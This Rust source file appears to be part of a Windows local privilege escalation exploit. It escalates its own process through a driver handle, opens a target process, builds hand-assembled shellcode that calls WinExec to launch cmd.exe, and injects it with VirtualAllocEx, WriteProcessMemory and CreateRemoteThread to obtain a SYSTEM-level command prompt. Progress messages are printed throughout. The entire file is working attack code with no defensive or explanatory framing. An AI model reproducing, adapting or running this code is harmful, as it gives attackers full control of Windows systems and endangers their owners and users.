use std::sync::atomic::{AtomicI32, Ordering};
use std::ffi::c_void;

use windows::{
    core::s,
    Win32::{
        Foundation::{CloseHandle, HANDLE},
        System::{
            LibraryLoader::{GetModuleHandleA, GetProcAddress},
            Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
            Diagnostics::Debug::WriteProcessMemory,
            Threading::{
                CreateRemoteThread, WaitForSingleObject,
                INFINITE, CreateThread, THREAD_CREATE_RUN_IMMEDIATELY,
            },
        },
    },
};

use crate::proto::{Handle, make_wbcc};
use crate::session::{escalate, open_proc};
use crate::wbmf::{install_trampoline, set_page_rx};

pub static LPE_STATUS: AtomicI32 = AtomicI32::new(i32::MIN);

#[repr(C)]
pub struct LpeArgs { pub dev: Handle, pub pe_base: u64, pub our_pid: u32, pub target_pid: u32 }
unsafe impl Send for LpeArgs {}
unsafe impl Sync for LpeArgs {}
pub static mut G_LPE: LpeArgs = LpeArgs { dev: 0, pe_base: 0, our_pid: 0, target_pid: 0 };

// WinExec("cmd.exe /c start cmd.exe", SW_SHOW)
// "start cmd.exe" creates a new window in Session 1 on the interactive desktop.
// The outer "cmd.exe /c" is needed so WinExec has a process to wait on.
const CMD_STR: &[u8] = b"cmd.exe /c start cmd.exe\0";

// Shellcode layout (total = 33 + len(CMD_STR) bytes):
//   sub  rsp, 0x28              [4]
//   lea  rcx, [rip + offset]    [7]  → CMD_STR at end of blob
//   mov  edx, 1                 [5]  SW_SHOWNORMAL
//   mov  rax, <winexec_abs>     [10]
//   call rax                    [2]
//   add  rsp, 0x28              [4]
//   ret                         [1]
//   CMD_STR bytes               [N]
fn build_shellcode(winexec_addr: u64) -> Vec<u8> {
    let str_len = CMD_STR.len();
    // lea rcx, [rip + offset] — offset is relative to next instruction (after the 7-byte lea)
    // instructions after lea: mov edx(5) + mov rax(10) + call(2) + add(4) + ret(1) = 22 bytes
    let rip_offset: u32 = 22;
    let mut sc = Vec::with_capacity(33 + str_len);
    sc.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);                          // sub rsp, 0x28
    sc.extend_from_slice(&[0x48, 0x8D, 0x0D]);
    sc.extend_from_slice(&rip_offset.to_le_bytes());                            // lea rcx, [rip+N]
    sc.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]);                    // mov edx, 1
    sc.extend_from_slice(&[0x48, 0xB8]);
    sc.extend_from_slice(&winexec_addr.to_le_bytes());                          // mov rax, imm64
    sc.extend_from_slice(&[0xFF, 0xD0]);                                       // call rax
    sc.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]);                          // add rsp, 0x28
    sc.extend_from_slice(&[0xC3]);                                             // ret
    sc.extend_from_slice(CMD_STR);
    sc
}

unsafe extern "system" fn lpe_worker(_: *mut c_void) -> u32 {
    let a    = &G_LPE;
    let wbcc = make_wbcc(a.pe_base);

    if !escalate(a.dev, &wbcc, a.our_pid) {
        LPE_STATUS.store(-1, Ordering::SeqCst);
        return 1;
    }

    let proc_raw = match open_proc(a.dev, &wbcc, a.target_pid) {
        Ok(h)  => h,
        Err(e) => { LPE_STATUS.store(e, Ordering::SeqCst); return 1; }
    };
    let proc_handle = HANDLE(proc_raw as *mut c_void);

    // WinExec VA is identical in every process on this boot (per-boot ASLR)
    let winexec_addr: u64 = {
        let k32 = match GetModuleHandleA(s!("kernel32.dll")) {
            Ok(h)  => h,
            Err(_) => { LPE_STATUS.store(-1, Ordering::SeqCst); return 1; }
        };
        match GetProcAddress(k32, s!("WinExec")) {
            Some(p) => p as usize as u64,
            None    => { LPE_STATUS.store(-1, Ordering::SeqCst); return 1; }
        }
    };
    println!("[+] WinExec  {winexec_addr:#018x}");

    let sc = build_shellcode(winexec_addr);
    println!("[+] shellcode  {} bytes  payload: {:?}", sc.len(),
        std::str::from_utf8(CMD_STR).unwrap_or("?"));

    let remote_buf = VirtualAllocEx(
        proc_handle, None, sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    );
    if remote_buf.is_null() {
        let _ = CloseHandle(proc_handle);
        eprintln!("[-] VirtualAllocEx failed");
        LPE_STATUS.store(-1, Ordering::SeqCst);
        return 1;
    }
    println!("[+] remote alloc  {:#018x}  ({} bytes)", remote_buf as u64, sc.len());

    let mut written = 0usize;
    if WriteProcessMemory(proc_handle, remote_buf, sc.as_ptr() as _, sc.len(), Some(&mut written)).is_err() {
        let _ = CloseHandle(proc_handle);
        eprintln!("[-] WriteProcessMemory failed");
        LPE_STATUS.store(-1, Ordering::SeqCst);
        return 1;
    }
    println!("[+] wrote  {written} bytes");

    let th = match CreateRemoteThread(
        proc_handle, None, 0, Some(std::mem::transmute(remote_buf)), None, 0, None,
    ) {
        Ok(h)  => h,
        Err(e) => {
            let _ = CloseHandle(proc_handle);
            eprintln!("[-] CreateRemoteThread: {e}");
            LPE_STATUS.store(-1, Ordering::SeqCst);
            return 1;
        }
    };
    println!("[+] remote thread  {:#x}", th.0 as u64);

    WaitForSingleObject(th, 5000);
    let _ = CloseHandle(th);
    let _ = CloseHandle(proc_handle);
    println!("[+] done — SYSTEM cmd.exe window should appear on your desktop");
    LPE_STATUS.store(0, Ordering::SeqCst);
    0
}

pub fn run_lpe(dev: Handle, pe_ptr: *mut u8, soi: usize, our_pid: u32, target_pid: u32) -> i32 {
    println!("[+] source pid={target_pid}");

    let pe_base = pe_ptr as u64;
    unsafe { G_LPE = LpeArgs { dev, pe_base, our_pid, target_pid }; }
    install_trampoline(pe_ptr, 0x560, lpe_worker as u64);
    println!("[+] trampoline  {:#x} -> lpe_worker", pe_base + 0x560);
    unsafe { set_page_rx(pe_ptr, soi); }

    let entry: windows::Win32::System::Threading::LPTHREAD_START_ROUTINE =
        unsafe { std::mem::transmute((pe_base + 0x560) as usize) };
    let th = unsafe {
        CreateThread(None, 0, entry, None, THREAD_CREATE_RUN_IMMEDIATELY, None)
            .expect("CreateThread(lpe_worker)")
    };
    unsafe { WaitForSingleObject(th, INFINITE); let _ = CloseHandle(th); }
    LPE_STATUS.load(Ordering::SeqCst)
}
